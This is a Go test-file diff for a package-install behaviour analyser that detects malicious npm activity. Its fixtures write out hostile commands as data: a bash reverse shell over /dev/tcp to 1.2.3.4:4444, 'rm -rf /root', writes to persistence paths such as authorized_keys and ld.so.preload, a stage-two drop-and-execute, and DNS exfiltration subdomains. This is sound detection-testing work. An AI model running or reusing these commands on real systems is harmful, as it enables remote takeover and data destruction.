@@ -104,6 +104,79 @@ func TestSystemConfigReadsNotFlagged(t *testing.T) {
 	}
 }
 
+func TestPersistenceWrite(t *testing.T) {
+	for _, path := range []string{"/etc/cron.d/x", "/root/.bashrc", "/root/.ssh/authorized_keys", "/etc/systemd/system/x.service", "/etc/ld.so.preload"} {
+		tr := &Trace{Analysis: map[string]Phase{"install": {Files: []FileOp{{Path: path, Write: true}}}}}
+		if rules(Analyze(verdict.NPM, tr))["persistence-write"] != verdict.SevCritical {
+			t.Errorf("persistence-write not flagged for %s", path)
+		}
+	}
+}
+
+func TestReverseShellAndDestruction(t *testing.T) {
+	rs := &Trace{Analysis: map[string]Phase{"install": {Commands: []Command{{Command: []string{"bash", "-c", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}}}}}}
+	if rules(Analyze(verdict.NPM, rs))["reverse-shell"] != verdict.SevCritical {
+		t.Fatal("reverse-shell not flagged")
+	}
+	rm := &Trace{Analysis: map[string]Phase{"install": {Commands: []Command{{Command: []string{"sh", "-c", "rm -rf /root"}}}}}}
+	if rules(Analyze(verdict.NPM, rm))["data-destruction"] != verdict.SevCritical {
+		t.Fatal("rm -rf /root not flagged as data-destruction")
+	}
+}
+
+func TestDropAndExecute(t *testing.T) {
+	tr := &Trace{Analysis: map[string]Phase{"install": {
+		Files:    []FileOp{{Path: "/tmp/stage2", Write: true}},
+		Commands: []Command{{Command: []string{"sh", "-c", "/tmp/stage2"}}},
+	}}}
+	if rules(Analyze(verdict.NPM, tr))["download-and-execute"] != verdict.SevCritical {
+		t.Fatal("drop-and-execute not flagged")
+	}
+}
+
+func TestMiningPoolEgress(t *testing.T) {
+	tr := &Trace{Analysis: map[string]Phase{"execute": {Sockets: []Socket{{Address: "45.9.148.1", Port: 3333}}}}}
+	if rules(Analyze(verdict.NPM, tr))["mining-pool-egress"] != verdict.SevHigh {
+		t.Fatal("mining-pool port not flagged")
+	}
+}
+
+func TestReconBurstAndDNSExfil(t *testing.T) {
+	recon := &Trace{Analysis: map[string]Phase{"install": {Commands: []Command{
+		{Command: []string{"uname", "-a"}}, {Command: []string{"whoami"}}, {Command: []string{"hostname"}},
+	}}}}
+	if rules(Analyze(verdict.NPM, recon))["recon-burst"] != verdict.SevMedium {
+		t.Fatal("recon-burst not flagged for 3 distinct tools")
+	}
+	var qs []DNSQuery
+	for _, s := range []string{"YWJjZGVmZ2hpamtsbW5vcHFyc3R1", "MHhkZWFkYmVlZmNhZmViYWJlMDAx", "cXdlcnR5dWlvcGFzZGZnaGprbHo"} {
+		qs = append(qs, DNSQuery{Hostname: s + ".exfil.example"})
+	}
+	dx := &Trace{Analysis: map[string]Phase{"install": {DNS: []DNSRecord{{Queries: qs}}}}}
+	if rules(Analyze(verdict.NPM, dx))["dns-exfil"] != verdict.SevHigh {
+		t.Fatal("dns-exfil not flagged for encoded-subdomain burst")
+	}
+}
+
+func TestNativeBuildNotFlagged(t *testing.T) {
+	// A benign native build: compiler spawns + writes into its own build dir +
+	// one uname to detect the platform. None of it may produce a signal.
+	tr := &Trace{Analysis: map[string]Phase{"install": {
+		Commands: []Command{
+			{Command: []string{"node-gyp", "rebuild"}},
+			{Command: []string{"sh", "-c", "make -j4"}},
+			{Command: []string{"gcc", "-c", "binding.cc"}},
+			{Command: []string{"uname", "-s"}},
+		},
+		Files: []FileOp{{Path: "/root/.npm/_cacache/tmp/x", Write: true}, {Path: "build/Release/foo.node", Write: true}},
+	}}}
+	for _, s := range Analyze(verdict.NPM, tr) {
+		if s.Severity == verdict.SevHigh || s.Severity == verdict.SevCritical || s.Severity == verdict.SevMedium {
+			t.Fatalf("native build produced an actionable signal: %+v", s)
+		}
+	}
+}
+
 func TestKnownRegistryEgressNotFlagged(t *testing.T) {
 	tr := &Trace{Analysis: map[string]Phase{"install": {DNS: []DNSRecord{{Queries: []DNSQuery{
 		{Hostname: "registry.npmjs.org"}, {Hostname: "files.pythonhosted.org"},
